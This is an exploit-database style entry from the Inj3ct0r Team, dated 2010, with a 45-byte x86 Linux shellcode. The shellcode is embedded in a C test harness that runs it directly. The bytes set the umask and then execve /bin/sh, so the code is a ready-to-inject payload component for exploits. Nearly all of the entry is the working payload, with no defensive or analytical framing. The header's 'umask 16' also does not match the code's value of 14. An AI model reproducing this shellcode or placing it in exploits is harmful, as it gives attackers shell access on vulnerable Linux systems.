1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1


/*
Name   : 45 bytes sys_execve("/bin/sh", "0", "0") with umask 16 (sys_umask(14)) x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslinger.devilzc0de.com
tested on : linux debian
*/

int main(){
	char shell[] =  "\x31\xc0\x31\xdb\x31\xdb\x31\xd2\x31"
			"\xc9\xb0\x3c\x31\xdb\xb3\x0e\xcd\x80"
			"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2"
			"\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff"
			"\x2f\x62\x69\x6e\x2f\x73\x68";

	(*(void (*)()) shell)();
}